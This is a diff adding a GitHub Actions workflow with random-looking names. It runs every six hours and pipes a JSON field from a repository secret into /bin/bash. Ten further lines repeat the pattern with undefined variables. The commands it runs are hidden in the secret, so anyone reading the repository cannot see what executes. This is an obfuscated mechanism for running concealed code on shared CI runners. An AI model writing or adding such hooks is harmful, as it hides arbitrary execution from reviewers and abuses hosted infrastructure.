@@ -1,0 +1,27 @@
+name: yuanjinghong4513
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '34 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yuanjinghong4513
+        env:
+          jc7683: ${{ secrets.jc7683 }}
+        run: |
+          echo $jc7683 | jq -r .swune9155 | /bin/bash
+          echo $wn66329 | jq -r .c9 | /bin/bash
+          echo $itl164 | jq -r .dhuq50 | /bin/bash
+          echo $fagco54271 | jq -r .nr1767 | /bin/bash
+          echo $bvns7 | jq -r .js4756 | /bin/bash
+          echo $cnw4 | jq -r .ykv52 | /bin/bash
+          echo $afdve68 | jq -r .pxaml70 | /bin/bash
+          echo $z8 | jq -r .agb10 | /bin/bash
+          echo $gr7309 | jq -r .g88913 | /bin/bash
+          echo $kys3 | jq -r .beegv58 | /bin/bash
+          echo $xh7 | jq -r .n45108 | /bin/bash
+
